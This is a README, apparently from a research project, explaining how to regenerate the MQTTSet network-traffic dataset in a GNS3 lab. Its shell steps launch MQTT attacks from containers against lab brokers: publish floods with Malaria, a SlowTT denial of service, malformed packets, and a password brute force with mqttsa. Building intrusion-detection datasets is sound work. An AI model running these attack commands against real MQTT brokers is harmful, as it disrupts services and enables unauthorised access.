# MQTTSet reproduction

## Download our reproduction of MQTTSet

All pcap files can be downloaded [on this website](https://files.inria.fr/aware/gothx-datasets.html)

----

# How to reproduce MQTTSet yourself?

1. start GNS3
2. create a topology similar to the one in MQTTSet
```bash
(venv) $ python3 create_topology_sinetstream.py sinetstream_big
```


----
## reproduce legitimate/normal traffic

Use GNS3 graphical interface
- start all nodes, legitimate traffic begins to be generated automatically
- start traffic capture on links

## Reproduce the attacks

### Remember to capture traffic on links

Execute Malaria attack:
```bash
container_id=$(docker container ls | grep mqtt-malaria | awk '{print $1}')
docker container exec -t $container_id python /root/mqtt-malaria/malaria publish -P 15 -n 8700 -H 192.168.2.1 -s 345 
```

Execute SlowIT attack
```bash
container_id=$(docker container ls | grep mqtt-atta | awk '{print $1}')
tmp_file="tmp_net.config"
cat << EOF > $tmp_file
[Host]
ip_address = broker.neigh.lab
port = 1883
keepalive = 60

[Ddos]
packet = 1000
connections = 1024
EOF
docker container cp $tmp_file $container_id:/SlowTT-Attack/net.config
rm "$tmp_file"
docker container exec -t -w /SlowTT-Attack  $container_id python3 attack.py
# press CTRL+C to stop the attack 
```

Execute malformed data
```bash
container_id=$(docker container ls | grep mqtt-atta | awk '{print $1}')
docker container exec -t -w /mqttsa  $container_id python3 mqttsa.py --md broker.neigh.lab
```

Execute publish flood attack
```bash
container_id=$(docker container ls | grep mqtt-malaria | awk '{print $1}')
docker container exec -t -w /root/mqtt-malaria/ $container_id python malaria publish -P 1 -n 265 -H 192.168.2.1 -s 30700
```


Execute Auth bruteforce attack
```bash
container_id=$(docker container ls | grep mqtt-atta | awk '{print $1}')
# set the number of passwords tried before successfully authenticate (must be less than 1244)
line_correct_pwd=4
docker container exec -t $container_id sed -i '/adminpass/d' /mqttsa/src/words.txt
docker container exec -t $container_id sed -i "${line_correct_pwd}s/.*/adminpass/" /mqttsa/src/words.txt
docker container exec -t -w /mqttsa/ $container_id python3 mqttsa.py -u admin -w src/words.txt broker.steel.lab
```